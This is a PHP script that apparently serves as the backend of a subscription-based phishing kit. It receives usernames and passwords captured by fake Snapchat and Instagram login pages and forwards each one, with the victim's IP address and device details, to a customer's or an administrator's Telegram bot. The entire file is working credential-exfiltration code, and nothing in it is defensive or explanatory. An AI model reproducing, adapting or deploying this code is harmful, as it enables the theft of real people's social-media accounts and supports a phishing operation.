<?php
// send_data.php - Forwards to user's bot or admin's global bot

require_once 'common/config.php';

function sendToTelegram($message, $bot_token, $chat_id) {
    if (empty($bot_token) || empty($chat_id)) return false;
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
    return true;
}

function getDeviceInfo($ua) {
    $device = 'Unknown'; $os = 'Unknown'; $browser = 'Unknown';
    if (preg_match('/windows|win32/i', $ua)) $os = 'Windows';
    elseif (preg_match('/macintosh|mac os x/i', $ua)) $os = 'Mac OS';
    elseif (preg_match('/linux/i', $ua)) $os = 'Linux';
    elseif (preg_match('/android/i', $ua)) $os = 'Android';
    elseif (preg_match('/iphone|ipad|ipod/i', $ua)) $os = 'iOS';
    if (preg_match('/mobile/i', $ua)) $device = 'Mobile';
    elseif (preg_match('/tablet|ipad/i', $ua)) $device = 'Tablet';
    else $device = 'Desktop';
    if (preg_match('/chrome/i', $ua)) $browser = 'Chrome';
    elseif (preg_match('/firefox/i', $ua)) $browser = 'Firefox';
    elseif (preg_match('/safari/i', $ua)) $browser = 'Safari';
    elseif (preg_match('/edge/i', $ua)) $browser = 'Edge';
    elseif (preg_match('/opera|opr/i', $ua)) $browser = 'Opera';
    return "$device • $os • $browser";
}

// Determine destination
$bot_token = '';
$chat_id = '';

if (isset($_POST['user_id']) && !empty($_POST['user_id'])) {
    // User-specific bot
    $user_id = intval($_POST['user_id']);
    $conn = getDB();
    $user = $conn->query("SELECT * FROM users WHERE id = $user_id AND status = 'active'")->fetch_assoc();
    if ($user && (! $user['expiry_timestamp'] || strtotime($user['expiry_timestamp']) >= time())) {
        $bot = $conn->query("SELECT * FROM bots WHERE assigned_to = $user_id AND status = 'active'")->fetch_assoc();
        if ($bot) {
            $bot_token = $bot['bot_token'];
            $chat_id = $bot['chat_id'];
        }
    }
    $conn->close();
} elseif (isset($_POST['is_admin']) && $_POST['is_admin'] == '1') {
    // Admin global bot from settings
    $conn = getDB();
    $result = $conn->query("SELECT setting_key, setting_value FROM settings WHERE setting_key IN ('bot_token', 'chat_id')");
    while ($row = $result->fetch_assoc()) {
        if ($row['setting_key'] == 'bot_token') $bot_token = $row['setting_value'];
        if ($row['setting_key'] == 'chat_id') $chat_id = $row['setting_value'];
    }
    $conn->close();
}

if (empty($bot_token) || empty($chat_id)) {
    http_response_code(403);
    exit();
}

// Get login data
$source = $_POST['source'] ?? 'unknown';
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$save_info = $_POST['save_info'] ?? '0';
$ip = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'];
$user_agent = $_POST['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$timestamp = $_POST['timestamp'] ?? date('Y-m-d H:i:s');

if (empty($username) && empty($password)) {
    http_response_code(400);
    exit();
}

$source_map = [
    'snap' => ['emoji' => '👻', 'name' => 'SNAP'],
    'instagram' => ['emoji' => '📷', 'name' => 'IG'],
    'unknown' => ['emoji' => '🔐', 'name' => 'LOGIN']
];
$emoji = $source_map[$source]['emoji'] ?? '🔐';
$source_name = $source_map[$source]['name'] ?? strtoupper($source);

$device_info = getDeviceInfo($user_agent);

$message = "<b>{$emoji} {$source_name} LOGIN DETECTED</b>\n\n";
$message .= "<b>👤 Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
$message .= "<b>🔑 Password:</b> <code>" . htmlspecialchars($password) . "</code>\n";
$message .= "<b>🌐 IP Address:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
$message .= "<b>📱 Device:</b> " . $device_info . "\n";
$message .= "<b>⏰ Time:</b> " . $timestamp . "\n";
$message .= "<b>🆔 Source:</b> " . $source_name;

sendToTelegram($message, $bot_token, $chat_id);

http_response_code(200);
exit();